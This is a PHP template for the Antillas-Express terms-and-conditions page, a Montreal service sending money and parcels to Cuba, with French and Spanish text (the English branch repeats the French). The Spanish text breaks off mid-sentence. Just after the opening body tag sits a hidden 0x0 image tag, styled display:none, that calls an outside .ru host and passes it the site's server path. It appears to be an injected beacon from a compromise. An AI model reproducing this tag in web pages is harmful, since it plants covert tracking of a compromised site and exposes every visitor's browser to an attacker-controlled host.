<?php
include('lib/config.php');

echo 
"<html>
	<head>
		<title>Antillas-express - Montreal to Cuba - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='12' cellspacing='0' align='$Enligne' border='0' >		
		<tr>
			<td>";
if ($_SESSION['langue']=="fr"){
?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                Termes et conditions </span> </p>
              <p class="normalTextBold">Nous vous invitons &agrave; lire attentivement 
                les conditions relatives aux services transactionnels en ligne 
                sur le site <span class="normalTextBold">Antillas-Express</span>.com. 
                Prenez bonne note des consignes d&#8217;utilisation encadrant 
                vos droits et obligations pour vous faciliter les choses.</p>
              <ul>
                <li class="normalText"><a href="#1">Inscription au service en 
                  ligne</a></li>
                <li class="normalText"><a href="#2">Votre compte et votre profil</a></li>
                <li class="normalText"><a href="#3">Heures d&#8217;ouverture</a></li>
                <li class="normalText"><a href="#4">Nous joindre</a></li>
                <li class="normalText"><a href="#5">Transactions (Consignes)</a></li>
                <li class="normalText"><a href="#6">Mode de paiement</a></li>
                <li class="normalText"><a href="#7">Solvabilit&eacute; (cr&eacute;dit)</a></li>
                <li class="normalText"><a href="#8">Image de marque (branding)</a></li>
                <li class="normalText"><a href="#9">Usage de l&#8217;adresse IP</a></li>
                <li class="normalText"><a href="#10">Responsabilit&eacute;s du 
                  membre</a></li>
                <li class="normalText"><a href="#11">Droits et obligations du 
                  groupe Antillas-Express</a></li>
                <li class="normalText"><a href="#12">R&egrave;glement des diff&eacute;rends</a></li>
                <li class="normalText"><a href="#13">Dommages collat&eacute;raux</a></li>
              </ul>
              <p class="normalText"><span class="normalTextBold"><br>
                <a name="1"></a>Inscription au service</span><br>
                Pour envoyer de l&#8217;argent et des colis &agrave; Cuba ou effectuer 
                des achats &agrave; exp&eacute;dier dans ce pays par le biais 
                du site <span class="normalTextBold"><span class="normalTextBold">Antillas-Express</span></span>, 
                vous devez vous inscrire. Il suffit juste d&#8217;ouvrir un compte 
                personnel dans la section Membre en page d&#8217;accueil principale 
                (bande de droite) du site Web ou encore en faisant un tour guid&eacute; 
                dans la zone Visiteur du service recherch&eacute; (ex : Fonds) 
                apr&egrave;s avoir cliqu&eacute; sur S&#8217;inscrire. </p>
              <p class="normalText">Vous entrez ensuite vos coordonn&eacute;es 
                requises, un nom d&#8217;utilisateur (code d&#8217;acc&egrave;s) 
                et un mot de passe. Gardez ces informations pr&eacute;cieusement 
                en pr&eacute;vision des prochaines sessions en ligne. Ne les divulguez 
                jamais &agrave; qui que ce soit afin d&#8217;&eacute;viter les 
                fraudes. Sinon, <span class="normalTextBold"><span class="normalTextBold">Antillas-Express</span></span> 
                se d&eacute;gage de toute responsabilit&eacute; touchant la s&eacute;curit&eacute; 
                des transactions, le rembouserment et la protection des renseignements 
                personnels.</p>
              <p class="normalText"><span class="normalTextBold"><a name="2"></a>Acc&egrave;s 
                &agrave; votre compte personnel</span><br>
                Si vous avez trait&eacute; avec nous par le biais du site transactionnel 
                d&#8217;<span class="normalTextBold">Antillas-Express</span>, 
                vous recevrez la confirmation de la transaction par courriel.</p>
              <p class="normalText"><span class="normalTextBold"><a name="3"></a>Heures 
                d&#8217;ouverture</span><br>
                La place d&#8217;affaires <span class="normalTextBold">Antillas-Express</span> 
                est sise &agrave; Montr&eacute;al dans la province de Qu&eacute;bec 
                au Canada.<br><br><?=$txt['Horaire'];?><br></p>
              <p class="normalText"><span class="normalTextBold"><a name="4"></a>Nous joindre :</span><br>
                <span class="normalTextBold">Antillas-Express</span><br>
            	<?=$param['adresse_client'];?><br><?=$param['ville_client'];?> 
              	<?=$param['province_client'];?>, <?=$param['pays_client'];?><br>
              	<?=$param['codepostal_client'];?></p>
              <p class="normalText"><span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
						<?=$param['telephone_client'];?><br>                
					<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
						<?=$param['fax_client'];?><br>
            	<span class="normalTextBold"><?=$txt['form_courriel'];?> :</span><br>
						<a href="mailto:<?php echo hexentities($param['email_support']) ?>">
						<?php echo hexentities($param['email_support']) ?></a></p>	
                <span class="normalTextBold">Page web</span> :<br>
                <a href="<?=$param['url'];?>"><?=$param['url'];?></a></p>
              <p class="normalText"><span class="normalTextBold"><a name="5"></a>Transactions 
                (consignes)</span><br>
                Vous choisissez un des services sur le site situ&eacute; en haut 
                de page, par exemple la section Fonds. Apr&egrave;s avoir entr&eacute; 
                votre adresse &eacute;lectronique et votre mot de passe dans votre 
                compte client (zone Membre), vous s&eacute;lectionnez dans le 
                catalogue les items correspondant &agrave; vos besoins. Les prix 
                et les frais de transaction s&#8217;additionnent automatiquement 
                dans le formulaire &agrave; la fin du processus en dollars am&eacute;ricains.</p>
              <p class="normalText">Pour obtenir la conversion dans la devise 
                de votre pays, vous utilisez le module de calcul qui accompagne 
                votre d&eacute;marche d&#8217;achat. Le total de la somme &agrave; 
                payer est alors report&eacute; dans le formulaire. Vous pouvez 
                alors supprimer des &eacute;l&eacute;ments, annuler l&#8217;op&eacute;ration 
                ou confirmer les transactions. </p>
              <p class="normalText">Si vous l&#8217;approuvez, il vous reste ensuite 
                &agrave; entrer les coordonn&eacute;es du destinataire ou du b&eacute;n&eacute;ficiaire 
                du service &agrave; Cuba. Vous verrez ensuite appara&icirc;tre 
                un tableau pr&eacute;sentant la liste des transactions, le montant, 
                les informations &agrave; propos du b&eacute;n&eacute;ficiaire. 
                Apr&egrave;s avoir confirm&eacute; le tout, vous tapez votre num&eacute;ro 
                de carte de cr&eacute;dit. Une fois que vous avez valid&eacute;, 
                la commande est achemin&eacute;e &agrave; notre service. Dans 
                les minutes qui suivent, vous recevez par courriel confirmation 
                de la transaction. </p>
              <p class="normalText"><span class="normalTextBold"><a name="6"></a>Modes 
                de paiement</span><br>
                Nous acceptons les paiements en ligne par carte de cr&eacute;dit 
                (Visa, Master Card, American Express), par Money Order International, 
                ch&egrave;ques certifi&eacute;es et par Western Union. &Agrave; 
                notre bureau de Montr&eacute;al, vous pouvez payer sur place par 
                carte de d&eacute;bit.</p>
              <p class="normalText"><span class="normalTextBold"><a name="8"></a>Image 
                de marque (branding)</span><br>
                Il est formellement interdit d&#8217;utiliser l&#8217;image de 
                marque, le branding et le logo d&#8217;<span class="normalTextBold">Antillas-Express</span> 
                &agrave; quelque fin que ce soit sans son consentement sous peine 
                de poursuites judiciaires devant les tribunaux.</p>
              <p class="normalText"><span class="normalTextBold"><a name="9"></a>Usage 
                de l&#8217;adresse IP</span><br>
                Question de pr&eacute;venir les fraudes, notre syst&egrave;me 
                de s&eacute;curit&eacute; informatique retrace votre adresse IP 
                chaque fois que vous faites une requ&ecirc;te sur le site <span class="normalTextBold">Antillas-Express</span>. 
                Ces renseignements servent &agrave; valider l&#8217;identit&eacute; 
                de l&#8217;utilisateur, le code d&#8217;acc&egrave;s, les transactions, 
                les commandes et les paiements en ligne. </p>
              <p class="normalText"><span class="normalTextBold"><a name="10"></a>Responsabilit&eacute;s 
                du membre</span><br>
                Vous ne pouvez d&eacute;tenir plus d&#8217;un compte-client chez 
                <span class="normalTextBold">Antillas-Express</span>. Vous &ecirc;tes 
                responsable de fournir des renseignements exacts &agrave; propos 
                de votre profil personnel, de votre situation de cr&eacute;dit 
                et des coordonn&eacute;es du destinataire ou du b&eacute;n&eacute;ficiaire 
                du service &agrave; Cuba.</p>
              <p class="normalText">Nous ne remboursons pas des paiements affectu&eacute;s 
                en ligne si vous avez commis une erreur sur l&#8217;identit&eacute; 
                du destinataire ou du b&eacute;n&eacute;ficiaire pour un service 
                rendu &agrave; Cuba, pas plus si vous vous trompez dans le montant 
                final de la transaction. </p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                n&#8217;est pas tenue de vous accorder un cr&eacute;dit non plus 
                si le total de la transaction n&#8217;a pas obtenu l&#8217;approbation 
                des gens de votre entourage impliqu&eacute;s dans la transaction. 
                En principe, la d&eacute;cision appartient &agrave; l&#8217;auteur 
                de la carte de cr&eacute;dit ou &agrave; celui ou &agrave; celle 
                qui est autoris&eacute; &agrave; en faire usage. Soyez vigilant&nbsp;!</p>
              <p class="normalText"><span class="normalTextBold"><a name="11" id="11"></a>Droits 
                et obligations de Antillas-Express</span><br>
                <span class="normalTextBold">Antillas-Express</span> se r&eacute;serve 
                le droit d&#8217;acc&eacute;der &agrave; votre dossier et de v&eacute;rifier 
                vos op&eacute;rations les plus fr&eacute;quentes afin d&#8217;&eacute;viter 
                le blanchiment d&#8217;argent ou la fraude.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                a le droit de fermer votre compte, de refuser ou d&#8217;annuler 
                une transaction que vous avez effectu&eacute;e ou encore d&#8217;&eacute;mettre 
                des restrictions aux conditions d&#8217;utilisation n&#8217;importe 
                quand si nous avons raison de croire que :</p>
              <blockquote>
                <p class="normalText">a) vous avez donn&eacute; de fausses informations 
                  &agrave; votre sujet;<br>
                  b) vous avez refil&eacute; votre mot de passe &agrave; quelqu&#8217;un;</p>
              </blockquote>
              <p class="normalText">En cas d&#8217;irr&eacute;gularit&eacute;s 
                de la part du client, <span class="normalTextBold">Antillas-Express</span> 
                se r&eacute;serve le droit d&#8217;amender les conditions de l&#8217;entente 
                conform&eacute;ment aux lois canadiennes. Le membre sera inform&eacute; 
                des changements le concernant par le biais de l&#8217;adresse 
                &eacute;lectronique de son compte personnel, sans affecter toutefois 
                la nature des termes des transactions ant&eacute;rieures.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                n&#8217;est pas responsable de quelque dommage que ce soit qui 
                serait attribuable de pr&egrave;s ou de loin &agrave; l&#8217;usage 
                de son service en ligne.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                n&#8217;est pas li&eacute;e &agrave; un d&eacute;couvert (perte 
                financi&egrave;re) de votre part s&#8217;il d&eacute;coule de 
                probl&egrave;mes techniques hors de notre contr&ocirc;le, tels 
                un virus, un acte de piratage, une action frauduleuse, un vol, 
                une erreur d&#8217;op&eacute;ration, un acc&egrave;s interdit, 
                une ligne t&eacute;l&eacute;phonique d&eacute;fectueuse, un ordinateur 
                dysfonctionnel, une suite de logiciels incompatibles ou toutes 
                autres conditions environnementales d&eacute;favorables et nuisibles.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                est en droit d&#8217;exiger du client (membre) un d&eacute;lai 
                de 21 jours avant de d&eacute;livrer un service lorsqu&#8217;elle 
                consid&egrave;re opportun d&#8217;investiguer &agrave; propos 
                de l&#8217;origine d&#8217;une transaction r&eacute;alis&eacute;e 
                sur notre site en accord avec des normes et pratiques internationales 
                en la mati&egrave;re.</p>
              <p class="normalText"><span class="normalTextBold"><a name="12"></a>R&egrave;glement 
                des diff&eacute;rends</span><br>
                Advenant un diff&eacute;rends reli&eacute; &agrave; un service 
                rendu par <span class="normalTextBold">Antillas-Express</span>, 
                les deux parties (vous et nous) s&#8217;engagent &agrave; r&eacute;gler 
                la m&eacute;sentente contractuelle devant un processus d&#8217;arbitrage. 
                Et la d&eacute;cision est finale et sans appel.</p>
              <p class="normalText"><span class="normalTextBold"><a name="13"></a>Dommages 
                collat&eacute;raux</span><br>
                Nous ne sommes pas responsable, ni directement ni indirectement 
                ni accidentellement, des dommages, poursuites ou tous pr&eacute;judices 
                r&eacute;clam&eacute;s par une tierce personne devant la loi &agrave; 
                l&#8217;occasion et cons&eacute;cutivement &agrave; la livraison 
                du service par <span class="normalTextBold">Antillas-Express</span></p>
            </blockquote>
<?
} 
elseif( $_SESSION['langue'] == "en" ){
?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                Termes et conditions </span> </p>
              <p class="normalTextBold">Nous vous invitons &agrave; lire attentivement 
                les conditions relatives aux services transactionnels en ligne 
                sur le site <span class="normalTextBold">Antillas-Express</span>.com. 
                Prenez bonne note des consignes d&#8217;utilisation encadrant 
                vos droits et obligations pour vous faciliter les choses.</p>
              <ul>
                <li class="normalText"><a href="#1">Inscription au service en 
                  ligne</a></li>
                <li class="normalText"><a href="#2">Votre compte et votre profil</a></li>
                <li class="normalText"><a href="#3">Heures d&#8217;ouverture</a></li>
                <li class="normalText"><a href="#4">Nous joindre</a></li>
                <li class="normalText"><a href="#5">Transactions (Consignes)</a></li>
                <li class="normalText"><a href="#6">Mode de paiement</a></li>
                <li class="normalText"><a href="#7">Solvabilit&eacute; (cr&eacute;dit)</a></li>
                <li class="normalText"><a href="#8">Image de marque (branding)</a></li>
                <li class="normalText"><a href="#9">Usage de l&#8217;adresse IP</a></li>
                <li class="normalText"><a href="#10">Responsabilit&eacute;s du 
                  membre</a></li>
                <li class="normalText"><a href="#11">Droits et obligations du 
                  groupe Antillas-Express</a></li>
                <li class="normalText"><a href="#12">R&egrave;glement des diff&eacute;rends</a></li>
                <li class="normalText"><a href="#13">Dommages collat&eacute;raux</a></li>
              </ul>
              <p class="normalText"><span class="normalTextBold"><br>
                <a name="1"></a>Inscription au service</span><br>
                Pour envoyer de l&#8217;argent et des colis &agrave; Cuba ou effectuer 
                des achats &agrave; exp&eacute;dier dans ce pays par le biais 
                du site <span class="normalTextBold"><span class="normalTextBold">Antillas-Express</span></span>, 
                vous devez vous inscrire. Il suffit juste d&#8217;ouvrir un compte 
                personnel dans la section Membre en page d&#8217;accueil principale 
                (bande de droite) du site Web ou encore en faisant un tour guid&eacute; 
                dans la zone Visiteur du service recherch&eacute; (ex : Fonds) 
                apr&egrave;s avoir cliqu&eacute; sur S&#8217;inscrire. </p>
              <p class="normalText">Vous entrez ensuite vos coordonn&eacute;es 
                requises, un nom d&#8217;utilisateur (code d&#8217;acc&egrave;s) 
                et un mot de passe. Gardez ces informations pr&eacute;cieusement 
                en pr&eacute;vision des prochaines sessions en ligne. Ne les divulguez 
                jamais &agrave; qui que ce soit afin d&#8217;&eacute;viter les 
                fraudes. Sinon, <span class="normalTextBold"><span class="normalTextBold">Antillas-Express</span></span> 
                se d&eacute;gage de toute responsabilit&eacute; touchant la s&eacute;curit&eacute; 
                des transactions, le rembouserment et la protection des renseignements 
                personnels.</p>
              <p class="normalText"><span class="normalTextBold"><a name="2"></a>Acc&egrave;s 
                &agrave; votre compte personnel</span><br>
                Si vous avez trait&eacute; avec nous par le biais du site transactionnel 
                d&#8217;<span class="normalTextBold">Antillas-Express</span>, 
                vous recevrez la confirmation de la transaction par courriel.</p>
              <p class="normalText"><span class="normalTextBold"><a name="3"></a>Heures 
                d&#8217;ouverture</span><br>
                La place d&#8217;affaires <span class="normalTextBold">Antillas-Express</span> 
                est sise &agrave; Montr&eacute;al dans la province de Qu&eacute;bec 
                au Canada.<br><br><?=$txt['Horaire'];?><br></p>
              <p class="normalText"><span class="normalTextBold"><a name="4"></a>Nous joindre :</span><br>
                <span class="normalTextBold">Antillas-Express</span><br>
            	<?=$param['adresse_client'];?><br><?=$param['ville_client'];?> 
              	<?=$param['province_client'];?>, <?=$param['pays_client'];?><br>
              	<?=$param['codepostal_client'];?></p>
              <p class="normalText"><span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
						<?=$param['telephone_client'];?><br>                
					<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
						<?=$param['fax_client'];?><br>
            	<span class="normalTextBold"><?=$txt['form_courriel'];?> :</span><br>
						<a href="mailto:<?php echo hexentities($param['email_support']) ?>">
						<?php echo hexentities($param['email_support']) ?></a></p>	
                <span class="normalTextBold">Page web</span> :<br>
                <a href="<?=$param['url'];?>"><?=$param['url'];?></a></p>
              <p class="normalText"><span class="normalTextBold"><a name="5"></a>Transactions 
                (consignes)</span><br>
                Vous choisissez un des services sur le site situ&eacute; en haut 
                de page, par exemple la section Fonds. Apr&egrave;s avoir entr&eacute; 
                votre adresse &eacute;lectronique et votre mot de passe dans votre 
                compte client (zone Membre), vous s&eacute;lectionnez dans le 
                catalogue les items correspondant &agrave; vos besoins. Les prix 
                et les frais de transaction s&#8217;additionnent automatiquement 
                dans le formulaire &agrave; la fin du processus en dollars am&eacute;ricains.</p>
              <p class="normalText">Pour obtenir la conversion dans la devise 
                de votre pays, vous utilisez le module de calcul qui accompagne 
                votre d&eacute;marche d&#8217;achat. Le total de la somme &agrave; 
                payer est alors report&eacute; dans le formulaire. Vous pouvez 
                alors supprimer des &eacute;l&eacute;ments, annuler l&#8217;op&eacute;ration 
                ou confirmer les transactions. </p>
              <p class="normalText">Si vous l&#8217;approuvez, il vous reste ensuite 
                &agrave; entrer les coordonn&eacute;es du destinataire ou du b&eacute;n&eacute;ficiaire 
                du service &agrave; Cuba. Vous verrez ensuite appara&icirc;tre 
                un tableau pr&eacute;sentant la liste des transactions, le montant, 
                les informations &agrave; propos du b&eacute;n&eacute;ficiaire. 
                Apr&egrave;s avoir confirm&eacute; le tout, vous tapez votre num&eacute;ro 
                de carte de cr&eacute;dit. Une fois que vous avez valid&eacute;, 
                la commande est achemin&eacute;e &agrave; notre service. Dans 
                les minutes qui suivent, vous recevez par courriel confirmation 
                de la transaction. </p>
              <p class="normalText"><span class="normalTextBold"><a name="6"></a>Modes 
                de paiement</span><br>
                Nous acceptons les paiements en ligne par carte de cr&eacute;dit 
                (Visa, Master Card, American Express), par Money Order International, 
                ch&egrave;ques certifi&eacute;es et par Western Union. &Agrave; 
                notre bureau de Montr&eacute;al, vous pouvez payer sur place par 
                carte de d&eacute;bit.</p>
              <p class="normalText"><span class="normalTextBold"><a name="8"></a>Image 
                de marque (branding)</span><br>
                Il est formellement interdit d&#8217;utiliser l&#8217;image de 
                marque, le branding et le logo d&#8217;<span class="normalTextBold">Antillas-Express</span> 
                &agrave; quelque fin que ce soit sans son consentement sous peine 
                de poursuites judiciaires devant les tribunaux.</p>
              <p class="normalText"><span class="normalTextBold"><a name="9"></a>Usage 
                de l&#8217;adresse IP</span><br>
                Question de pr&eacute;venir les fraudes, notre syst&egrave;me 
                de s&eacute;curit&eacute; informatique retrace votre adresse IP 
                chaque fois que vous faites une requ&ecirc;te sur le site <span class="normalTextBold">Antillas-Express</span>. 
                Ces renseignements servent &agrave; valider l&#8217;identit&eacute; 
                de l&#8217;utilisateur, le code d&#8217;acc&egrave;s, les transactions, 
                les commandes et les paiements en ligne. </p>
              <p class="normalText"><span class="normalTextBold"><a name="10"></a>Responsabilit&eacute;s 
                du membre</span><br>
                Vous ne pouvez d&eacute;tenir plus d&#8217;un compte-client chez 
                <span class="normalTextBold">Antillas-Express</span>. Vous &ecirc;tes 
                responsable de fournir des renseignements exacts &agrave; propos 
                de votre profil personnel, de votre situation de cr&eacute;dit 
                et des coordonn&eacute;es du destinataire ou du b&eacute;n&eacute;ficiaire 
                du service &agrave; Cuba.</p>
              <p class="normalText">Nous ne remboursons pas des paiements affectu&eacute;s 
                en ligne si vous avez commis une erreur sur l&#8217;identit&eacute; 
                du destinataire ou du b&eacute;n&eacute;ficiaire pour un service 
                rendu &agrave; Cuba, pas plus si vous vous trompez dans le montant 
                final de la transaction. </p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                n&#8217;est pas tenue de vous accorder un cr&eacute;dit non plus 
                si le total de la transaction n&#8217;a pas obtenu l&#8217;approbation 
                des gens de votre entourage impliqu&eacute;s dans la transaction. 
                En principe, la d&eacute;cision appartient &agrave; l&#8217;auteur 
                de la carte de cr&eacute;dit ou &agrave; celui ou &agrave; celle 
                qui est autoris&eacute; &agrave; en faire usage. Soyez vigilant&nbsp;!</p>
              <p class="normalText"><span class="normalTextBold"><a name="11" id="11"></a>Droits 
                et obligations de Antillas-Express</span><br>
                <span class="normalTextBold">Antillas-Express</span> se r&eacute;serve 
                le droit d&#8217;acc&eacute;der &agrave; votre dossier et de v&eacute;rifier 
                vos op&eacute;rations les plus fr&eacute;quentes afin d&#8217;&eacute;viter 
                le blanchiment d&#8217;argent ou la fraude.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                a le droit de fermer votre compte, de refuser ou d&#8217;annuler 
                une transaction que vous avez effectu&eacute;e ou encore d&#8217;&eacute;mettre 
                des restrictions aux conditions d&#8217;utilisation n&#8217;importe 
                quand si nous avons raison de croire que :</p>
              <blockquote>
                <p class="normalText">a) vous avez donn&eacute; de fausses informations 
                  &agrave; votre sujet;<br>
                  b) vous avez refil&eacute; votre mot de passe &agrave; quelqu&#8217;un;</p>
              </blockquote>
              <p class="normalText">En cas d&#8217;irr&eacute;gularit&eacute;s 
                de la part du client, <span class="normalTextBold">Antillas-Express</span> 
                se r&eacute;serve le droit d&#8217;amender les conditions de l&#8217;entente 
                conform&eacute;ment aux lois canadiennes. Le membre sera inform&eacute; 
                des changements le concernant par le biais de l&#8217;adresse 
                &eacute;lectronique de son compte personnel, sans affecter toutefois 
                la nature des termes des transactions ant&eacute;rieures.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                n&#8217;est pas responsable de quelque dommage que ce soit qui 
                serait attribuable de pr&egrave;s ou de loin &agrave; l&#8217;usage 
                de son service en ligne.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                n&#8217;est pas li&eacute;e &agrave; un d&eacute;couvert (perte 
                financi&egrave;re) de votre part s&#8217;il d&eacute;coule de 
                probl&egrave;mes techniques hors de notre contr&ocirc;le, tels 
                un virus, un acte de piratage, une action frauduleuse, un vol, 
                une erreur d&#8217;op&eacute;ration, un acc&egrave;s interdit, 
                une ligne t&eacute;l&eacute;phonique d&eacute;fectueuse, un ordinateur 
                dysfonctionnel, une suite de logiciels incompatibles ou toutes 
                autres conditions environnementales d&eacute;favorables et nuisibles.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                est en droit d&#8217;exiger du client (membre) un d&eacute;lai 
                de 21 jours avant de d&eacute;livrer un service lorsqu&#8217;elle 
                consid&egrave;re opportun d&#8217;investiguer &agrave; propos 
                de l&#8217;origine d&#8217;une transaction r&eacute;alis&eacute;e 
                sur notre site en accord avec des normes et pratiques internationales 
                en la mati&egrave;re.</p>
              <p class="normalText"><span class="normalTextBold"><a name="12"></a>R&egrave;glement 
                des diff&eacute;rends</span><br>
                Advenant un diff&eacute;rends reli&eacute; &agrave; un service 
                rendu par <span class="normalTextBold">Antillas-Express</span>, 
                les deux parties (vous et nous) s&#8217;engagent &agrave; r&eacute;gler 
                la m&eacute;sentente contractuelle devant un processus d&#8217;arbitrage. 
                Et la d&eacute;cision est finale et sans appel.</p>
              <p class="normalText"><span class="normalTextBold"><a name="13"></a>Dommages 
                collat&eacute;raux</span><br>
                Nous ne sommes pas responsable, ni directement ni indirectement 
                ni accidentellement, des dommages, poursuites ou tous pr&eacute;judices 
                r&eacute;clam&eacute;s par une tierce personne devant la loi &agrave; 
                l&#8217;occasion et cons&eacute;cutivement &agrave; la livraison 
                du service par <span class="normalTextBold">Antillas-Express</span></p>
            </blockquote>
<?
} 
else {
?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                T&eacute;rminos y condiciones</span> </p>
              <p class="normalTextBold">Le invitamos a leer atentamente las condiciones 
                relativas a los servicios transaccionales en l&iacute;neas obre 
                el sitio Antillas-Express.com. Tenga en cuenta las consignas de 
                utilizaci&oacute;n enmarcadas por los derechos y obligaciones 
                para facilitarle su experiencia de compra.</p>
              <ul>
                <li class="normalText"><a href="#1">Inscripci&oacute;n al servicio 
                  en l&iacute;nea</a></li>
                <li class="normalText"><a href="#2">Acceso as u cuenta personal</a></li>
                <li class="normalText"><a href="#3">Horario de atenci&oacute;n</a></li>
                <li class="normalText"><a href="#4">Cont&aacute;ctenos</a></li>
                <li class="normalText"><a href="#5">Transacciones</a> (Consignas)</li>
                <li class="normalText"><a href="#6">Modo de pago</a></li>
                <li class="normalText"><a href="#7">Solvencia</a> (cr&eacute;dito)</li>
                <li class="normalText"><a href="#8">Imagen de marca</a> (branding)</li>
                <li class="normalText"><a href="#9">Uso de la direcci&oacute;n 
                  IP</a></li>
                <li class="normalText"><a href="#10">Responsabilidades del miembro</a></li>
                <li class="normalText"><a href="#11">Derechos y obligaciones de 
                  Antillas Express</a></li>
                <li class="normalText"><a href="#12">Reglamento de diferendos</a></li>
                <li class="normalText"><a href="#13">Da&ntilde;os colaterales</a></li>
              </ul>
              <p class="normalText"><span class="normalTextBold"><a name="1" id="1"></a>Inscripci&oacute;n 
                al servicio en l&iacute;nea<br>
                </span><span class="normalText">Para enviar dinero y paqueter&iacute;a 
                a Cuba o efectuar compras a ser entregadas en ese pa&iacute;s 
                por v&iacute;a de A</span><span class="normalTextBold">ntillas-Express</span><span class="normalText">, 
                usted debe inscribirse. Alcanza con abrir una cuenta personal 
                en la secci&oacute;n Miembro en la p&aacute;gina de bienvenida 
                (a la derecha) del sitio web o realizando una visita guiada en 
                la zona Visitante del servicio buscado (Ej.: fondos) luego de 
                haber marcado Inscribirse.</span></p>
              <p class="normalText">Luego ingresa los datos solicitados, un nombre 
                de usuario (c&oacute;digo de acceso) y una clave de acceso. Conserve 
                preciosamente estos datos para futuras transacciones en l&iacute;nea. 
                No los divulgue jam&aacute;s a nadie a fin de evitar fraudes. 
                En caso contrario, <span class="normalTextBold">Antillas-Express</span> 
                se deslinda de toda responsabilidad relacionada a la seguridad 
                de las transacciones, el reembolso y la protecci&oacute;n de sus 
                datos personales.</p>
              <p class="normalText"><span class="normalTextBold"><a name="2"></a>Acceso 
                a su cuenta personal<br>
                </span>Si usted ha realizado una operaci&oacute;n por medio del 
                sitio transaccional de <span class="normalTextBold">Antillas-Express</span>, 
                Usted recibir&aacute; una confirmaci&oacute;n de transacci&oacute;n 
                por correo electr&oacute;nico.</p>
              <p class="normalText"><span class="normalTextBold"><a name="3"></a>Horario 
                de atenci&oacute;n<br>
                </span>La oficina de <span class="normalTextBold">Antillas-Express</span> 
                est&aacute; situada en Montreal, en la provincia de Qu&eacute;bec 
                en el Canada.<br><br><?=$txt['Horaire'];?><br></p>
                
              <p class="normalText"><span class="normalTextBold"><a name="4"></a>Cont&aacute;ctenos :</span><br>
                <span class="normalTextBold">Antillas-Express</span><br>
            	<?=$param['adresse_client'];?><br><?=$param['ville_client'];?> 
              	<?=$param['province_client'];?>, <?=$param['pays_client'];?><br>
              	<?=$param['codepostal_client'];?></p>
              <p class="normalText"><span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
						<?=$param['telephone_client'];?><br>                
					<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
						<?=$param['fax_client'];?><br>
            	<span class="normalTextBold"><?=$txt['form_courriel'];?> :</span><br>
						<a href="mailto:<?php echo hexentities($param['email_support']) ?>">
						<?php echo hexentities($param['email_support']) ?></a></p>	
                <span class="normalTextBold">Sitio web</span> :<br>
                <a href="<?=$param['url'];?>"><?=$param['url'];?></a></p>
              <p class="normalText"><span class="normalTextBold"><a name="5"></a>Transacciones (Consignas)</span><br>
                Usted selecciona uno de los servicios sobre el sitio en 
                lo alto de la p&aacute;gina, por ejemplo la secci&oacute;n Fondos. 
                Luego de haber entrados u direcci&oacute;n de correo electr&oacute;nico 
                y su clave de acceso de vuestra cuenta (zona Miembro), seleccionad 
                el cat&aacute;logo los productos correspondientes a sus necesidades. 
                Los precios y los cargos de transacci&oacute;n se suman autom&aacute;ticamente 
                en su factura al finalizar el proceso, en d&oacute;lares americanos.</p>
              <p class="normalText">Para obtener la conversi&oacute;n a la divisa 
                de su pa&iacute;s, utilizamos el m&oacute;dulo de c&aacute;lculo 
                que acompa&ntilde;a su pedido de compra. El total de la suma apagar 
                es entonces reportada ene l formulario-factura. Usted puede suprimir 
                los elementos, anular la operaci&oacute;n o confirmar las transacciones.</p>
              <p><span class="normalText">Si Usted aprueba la transacci&oacute;n, 
                ingresar&aacute; a continuaci&oacute;n los datos del destinatario 
                o del beneficiario del servicio en Cuba. A continuaci&oacute;n 
                aparecer&aacute; un cuadro presentando la lista de las transacciones, 
                el importe y la informaci&oacute;n sobre el beneficiario. Despu&eacute;s 
                de haber confirmado todo, ingresar&aacute;s u n&uacute;mero de 
                tarjeta de cr&eacute;dito. Una vez que haya sido validada, la 
                solicitud es encaminada a nuestro servicio. En los minutos que 
                siguen, usted recibir&aacute; por correo electr&oacute;nico una 
                confirmaci&oacute;n del a transacci&oacute;n.</span></p>
              <p class="normalText"><span class="normalTextBold"><a name="6"></a>Modos 
                de pago<br>
                </span>Aceptamos los pagos en l&iacute;nea con tarjeta de cr&eacute;dito 
                (Visa, Master Card y American Express), por money order internacional, 
                cheques certificados y por transferencias de Western Union. En 
                nuestra oficina de Montreal, usted puede pagar en efectivo o con 
                tarjeta de d&eacute;bito.</p>
              <p class="normalText"><span class="normalTextBold"><a name="8"></a>Imagen 
                de marca (branding)</span><br>
                Est&aacute; prohibido la utilizaci&oacute;n de la imagen de marca, 
                el &#8220;branding&#8221; y el logotipo de <span class="normalTextBold">Antillas-Express</span> 
                para el fin que fuese sin nuestro consentimiento bajo pena de 
                persecuci&oacute;n judicial ante los tribunales.</p>
              <p class="normalText"><span class="normalTextBold"><a name="9"></a>Uso 
                del a direcci&oacute;n IP<br>
                </span>A los efectos de la prevenci&oacute;n de fraudes, nuestro 
                sistema de seguridad inform&aacute;tico registras u direcci&oacute;n 
                IP cada vez que Usted realiza una consulta sobre el sitio A<span class="normalTextBold">ntillas-Express</span>. 
